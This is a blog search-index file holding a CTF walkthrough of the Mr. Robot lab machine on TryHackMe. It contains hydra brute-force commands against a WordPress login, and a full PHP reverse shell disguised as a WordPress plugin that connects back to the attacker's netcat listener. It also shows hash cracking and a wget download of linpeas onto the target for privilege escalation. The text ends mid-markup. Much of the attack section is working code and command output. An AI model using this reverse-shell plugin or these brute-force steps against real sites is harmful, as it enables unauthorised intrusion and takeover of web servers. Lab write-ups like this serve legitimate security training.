<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Mr. Robot CTF - TryHackMe</title>
      <link href="/2020/07/09/Mr-Robot-TryHackMe/"/>
      <url>/2020/07/09/Mr-Robot-TryHackMe/</url>
      
        <content type="html"><![CDATA[<h1 id="Mr-Robot-CTF"><a href="#Mr-Robot-CTF" class="headerlink" title="Mr. Robot CTF"></a>Mr. Robot CTF</h1><p>Hey there! Today I am going to walk you through the Mr. Robot machine. I used the one on <a href="https://tryhackme.com/room/mrrobot" target="_blank" rel="noopener">TryHackMe</a>, but it is available on <a href="https://www.vulnhub.com/entry/mr-robot-1,151/" target="_blank" rel="noopener">Vulnhub</a> as well.</p><p>The first thing I always do (thanks to John Hammond) is to export the IP to a global variable. So $IP will refer to the target machine from now on.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> IP=10.10.99.113</span><br></pre></td></tr></table></figure><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>Let us start our enumeration as usual and do an nmap scan:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oN nmap/initial <span class="variable">$IP</span></span><br></pre></td></tr></table></figure><p>This is what we are working with:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-08 11:13 EDT</span><br><span class="line">Nmap scan report for 10.10.99.113</span><br><span class="line">Host is up (0.046s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE  SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp  closed ssh</span><br><span class="line">80&#x2F;tcp  open   http     Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">443&#x2F;tcp open   ssl&#x2F;http Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;www.example.com</span><br><span class="line">| Not valid before: 2015-09-16T10:45:03</span><br><span class="line">|_Not valid after:  2025-09-13T10:45:03</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 41.08 seconds</span><br></pre></td></tr></table></figure><p>We can see that there is a webserver up but there is nothing interesting at first glance, just some stuff about the Mr. Robot series.<br>Let‚Äôs run a dirbuster scan anyways.</p><p>Also let‚Äôs have a look at the robots.txt file, as the hint for the first key is ‚Äúrobots‚Äù.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">fsocity.dic</span><br><span class="line">key-1-of-3.txt</span><br></pre></td></tr></table></figure><p>That seems interesting. We have the first key and we should probably also download the dictionary file. Maybe we will need it later.</p><h2 id="Gaining-access"><a href="#Gaining-access" class="headerlink" title="Gaining access"></a>Gaining access</h2><p>Meanwhile, our dirbuster results should have come back. We can see a lot of folders and files relating to a WordPress installation probably for a blog. Especially interesting is the ‚Äúwp-login.php‚Äù file in the root of the webserver. Maybe we can get in that way with the credentials we downloaded earlier? Let us try that.<br>I used hydra with the following syntax:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L fsocity.dic -p <span class="built_in">test</span> <span class="variable">$IP</span> http-post-form <span class="string">"/wp-login/:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F<span class="variable">$IP</span>%2Fwp-admin%2F&amp;testcookie=1:F=Invalid username"</span></span><br></pre></td></tr></table></figure><p>Basically what we are doing is, we are trying to get the username from the .dic file. Luckily with WordPress, we can see whether the password or the username was wrong, so we first bruteforce the username and then the corresponding password.<br>We are also telling hydra in which post parameter to insert the username and password. You can get the post parameters through burp suite.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hydra v8.8 (c) 2019 by van Hauser&#x2F;THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2020-07-08 11:20:46</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235&#x2F;p:1), ~53640 tries per task</span><br><span class="line">[DATA] attacking http-post-form:&#x2F;&#x2F;$IP:80&#x2F;wp-login&#x2F;:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;http%3A%2F%2F$IP%2Fwp-admin%2F&amp;testcookie&#x3D;1:F&#x3D;Invalid username</span><br><span class="line">[80][http-post-form] host: $IP  login: Elliot   password: test</span><br></pre></td></tr></table></figure><p>Sweet! Now we got the user: <strong>Elliot</strong></p><p>Next, let us try to get the password!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l Elliot -P fsocity.dic <span class="variable">$IP</span> http-post-form <span class="string">"/wp-login/:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F<span class="variable">$IP</span>%2Fwp-admin%2F&amp;testcookie=1:S=302"</span></span><br></pre></td></tr></table></figure><p>We are using the same syntax as before but using ‚ÄúElliot‚Äù as the username and the .dic file as a wordlist for the password.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hydra v8.8 (c) 2019 by van Hauser&#x2F;THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2020-07-08 11:22:21</span><br><span class="line">[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1&#x2F;p:10), ~1 try per task</span><br><span class="line">[DATA] attacking http-post-form:&#x2F;&#x2F;$IP:80&#x2F;wp-login&#x2F;:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;http%3A%2F%2F$IP%2Fwp-admin%2F&amp;testcookie&#x3D;1:S&#x3D;302</span><br><span class="line">[...]</span><br><span class="line">[80][http-post-form] host: $IP   login: Elliot   password: ER28-0652</span><br></pre></td></tr></table></figure><p>Great! Now with the password (<strong>ER28-0652</strong>), it should be no problem to log in.</p><p>Once logged in we are greeted with the standard WordPress dashboard. Nothing has been done here, so it is quite empty. After looking around a bit I noticed that I could upload plugins. So why shouldn‚Äôt we upload our own special plugin üòÖ?</p><p>I just used the standard <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="noopener">php-reverse-shell</a> from pentestmonkey and modified it to my needs.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name:  Shelldon</span></span><br><span class="line"><span class="comment">Plugin URI: http://example.com</span></span><br><span class="line"><span class="comment">Description: Makes a Shelldon</span></span><br><span class="line"><span class="comment">Version: 1.0</span></span><br><span class="line"><span class="comment">Author: me</span></span><br><span class="line"><span class="comment">Author URI: http://www.me.com</span></span><br><span class="line"><span class="comment">Text Domain: revshell</span></span><br><span class="line"><span class="comment">Domain Path: /languages</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line"><span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  The author accepts no liability</span></span><br><span class="line"><span class="comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span></span><br><span class="line"><span class="comment">// do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// In all other respects the GPL version 2 applies:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">// it under the terms of the GNU General Public License version 2 as</span></span><br><span class="line"><span class="comment">// published by the Free Software Foundation.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">// GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You should have received a copy of the GNU General Public License along</span></span><br><span class="line"><span class="comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span></span><br><span class="line"><span class="comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  If these terms are not acceptable to</span></span><br><span class="line"><span class="comment">// you, then do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You are encouraged to send comments, improvements or suggestions to</span></span><br><span class="line"><span class="comment">// me at pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Description</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span></span><br><span class="line"><span class="comment">// The recipient will be given a shell running as the current user (apache normally).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Limitations</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span></span><br><span class="line"><span class="comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span></span><br><span class="line"><span class="comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Usage</span></span><br><span class="line"><span class="comment">// -----</span></span><br><span class="line"><span class="comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span></span><br><span class="line"></span><br><span class="line">set_time_limit (<span class="number">0</span>);</span><br><span class="line">$VERSION = <span class="string">"1.0"</span>;</span><br><span class="line">$ip = <span class="string">''</span>;  <span class="comment">// Your tun0 ip (ifconfig in terminal)</span></span><br><span class="line">$port = <span class="number">9999</span>;</span><br><span class="line">$chunk_size = <span class="number">1400</span>;</span><br><span class="line">$write_a = <span class="keyword">null</span>;</span><br><span class="line">$error_a = <span class="keyword">null</span>;</span><br><span class="line">$shell = <span class="string">'uname -a; w; id; /bin/sh -i'</span>;</span><br><span class="line">$daemon = <span class="number">0</span>;</span><br><span class="line">$debug = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line"><span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">'pcntl_fork'</span>)) &#123;</span><br><span class="line"><span class="comment">// Fork and have the parent process exit</span></span><br><span class="line">$pid = pcntl_fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">printit(<span class="string">"ERROR: Can't fork"</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($pid) &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make the current process a session leader</span></span><br><span class="line"><span class="comment">// Will only succeed if we forked</span></span><br><span class="line"><span class="keyword">if</span> (posix_setsid() == <span class="number">-1</span>) &#123;</span><br><span class="line">printit(<span class="string">"Error: Can't setsid()"</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$daemon = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">printit(<span class="string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change to a safe directory</span></span><br><span class="line">chdir(<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove any umask we inherited</span></span><br><span class="line">umask(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Do the reverse shell...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!$sock) &#123;</span><br><span class="line">printit(<span class="string">"$errstr ($errno)"</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spawn shell process</span></span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$process = proc_open($shell, $descriptorspec, $pipes);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource($process)) &#123;</span><br><span class="line">printit(<span class="string">"ERROR: Can't spawn shell"</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set everything to non-blocking</span></span><br><span class="line"><span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span></span><br><span class="line">stream_set_blocking($pipes[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($pipes[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($pipes[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($sock, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">printit(<span class="string">"Successfully opened reverse shell to $ip:$port"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// Check for end of TCP connection</span></span><br><span class="line"><span class="keyword">if</span> (feof($sock)) &#123;</span><br><span class="line">printit(<span class="string">"ERROR: Shell connection terminated"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check for end of STDOUT</span></span><br><span class="line"><span class="keyword">if</span> (feof($pipes[<span class="number">1</span>])) &#123;</span><br><span class="line">printit(<span class="string">"ERROR: Shell process terminated"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line">$read_a = <span class="keyword">array</span>($sock, $pipes[<span class="number">1</span>], $pipes[<span class="number">2</span>]);</span><br><span class="line">$num_changed_sockets = stream_select($read_a, $write_a, $error_a, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line"><span class="comment">// data to process's STDIN</span></span><br><span class="line"><span class="keyword">if</span> (in_array($sock, $read_a)) &#123;</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"SOCK READ"</span>);</span><br><span class="line">$input = fread($sock, $chunk_size);</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"SOCK: $input"</span>);</span><br><span class="line">fwrite($pipes[<span class="number">0</span>], $input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process's STDOUT</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (in_array($pipes[<span class="number">1</span>], $read_a)) &#123;</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"STDOUT READ"</span>);</span><br><span class="line">$input = fread($pipes[<span class="number">1</span>], $chunk_size);</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"STDOUT: $input"</span>);</span><br><span class="line">fwrite($sock, $input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process's STDERR</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (in_array($pipes[<span class="number">2</span>], $read_a)) &#123;</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"STDERR READ"</span>);</span><br><span class="line">$input = fread($pipes[<span class="number">2</span>], $chunk_size);</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"STDERR: $input"</span>);</span><br><span class="line">fwrite($sock, $input);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[<span class="number">0</span>]);</span><br><span class="line">fclose($pipes[<span class="number">1</span>]);</span><br><span class="line">fclose($pipes[<span class="number">2</span>]);</span><br><span class="line">proc_close($process);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Like print, but does nothing if we've daemonised ourself</span></span><br><span class="line"><span class="comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> <span class="params">($string)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!$daemon) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$string\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>We need this part at the top:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name:  Shelldon</span></span><br><span class="line"><span class="comment">Plugin URI: http://example.com</span></span><br><span class="line"><span class="comment">Description: Makes a Shelldon</span></span><br><span class="line"><span class="comment">Version: 1.0</span></span><br><span class="line"><span class="comment">Author: me</span></span><br><span class="line"><span class="comment">Author URI: http://www.me.com</span></span><br><span class="line"><span class="comment">Text Domain: revshell</span></span><br><span class="line"><span class="comment">Domain Path: /languages</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>I honestly don‚Äôt know what it does exactly but it makes it look like a WordPress plugin and only that way we can upload it.</p><p>So let‚Äôs do just that, upload our plugin, but don‚Äôt activate it yet. Before that, we have to listen for incoming connections with netcat on our machine.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 9999</span><br></pre></td></tr></table></figure><p>Now if we activate the plugin in the WordPress interface, the page should be stuck in a loading loop, and we should have a reverse shell in the terminal we started the netcat listener in.</p><p>This shell is not really stable and we can‚Äôt use our arrows or autocomplete, so I am going to be using some poor man‚Äôs pentest and use the stabilizeshell.sh script. (If you don‚Äôt know what I am talking about, check out this video <a href="https://www.youtube.com/watch?v=f2aSXGbD0NE" target="_blank" rel="noopener">here</a>)<br>That way we can use all the nice features of a shell.</p><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><p>With the new shell we can also easily see that we are connected as the ‚Äúdaemon‚Äù user, so let‚Äôs see if we have some home directories.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">daemon@linux:/$ <span class="built_in">cd</span> home/</span><br><span class="line">daemon@linux:/home$ ls</span><br><span class="line">robot</span><br><span class="line">daemon@linux:/home$ <span class="built_in">cd</span> robot/</span><br><span class="line">daemon@linux:/home/robot$ ls</span><br><span class="line">key-2-of-3.txtpassword.raw-md5</span><br></pre></td></tr></table></figure><p>We can see that there is another user called ‚Äúrobot‚Äù on this machine and he has a home. In there he has to files. A key, which we can sadly not cat out because it is owned by ‚Äúrobot‚Äù. So we do not have access to it. But there is something else interesting.<br>An md5 hash of a password, which we luckily can cat out.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">daemon@linux:/home/robot$ cat password.raw-md5</span><br><span class="line">robot:c3fcd3d76192e4007dfb496cca67e13b</span><br></pre></td></tr></table></figure><p>I was too lazy to do anything fancy in hashcat or john, so I just used <a href="https://crackstation.net/" target="_blank" rel="noopener">crackstation.net</a>, it gives us the result way faster:</p><img src="/2020/07/09/Mr-Robot-TryHackMe/crackstation.png" class="" title="Crackstation"><p>Now that we have his credentials, let‚Äôs login as ‚Äúrobot‚Äù</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su robot</span><br></pre></td></tr></table></figure><p>(And of course type in the password we just found)</p><p>Cool, we are now ‚Äúrobot‚Äù, means that we now have access to the second key.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">daemon@linux:/home/robot$ cat key-2-of-3.txt</span><br><span class="line">key2</span><br></pre></td></tr></table></figure><h2 id="Getting-root"><a href="#Getting-root" class="headerlink" title="Getting root"></a>Getting root</h2><p>Now that we have a user with more privileges we should try and get ourselves root. For that, I got <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" target="_blank" rel="noopener">linpeas</a> on the target machine.<br>I did that by using my machine as a server and downloading linpeas from my machine. (You could also just directly download linpeas to be honest but I did it that way)</p><p>To open up the server (Do that on <strong>your</strong> computer):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><p>Download files (Do that on the <strong>target</strong> machine):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /dev/shm/</span><br><span class="line">wget <span class="string">"<span class="variable">$YOURIP</span>:8000/linpeas.sh"</span></span><br></pre></td></tr></table></figure><p>($YOURIP is your tun0 ip that shows up if you run ifconfig)</p><p>Now mark linpeas.sh as an executable</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x linpeas.sh</span><br></pre></td></tr></table></figure><p>And run and save it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 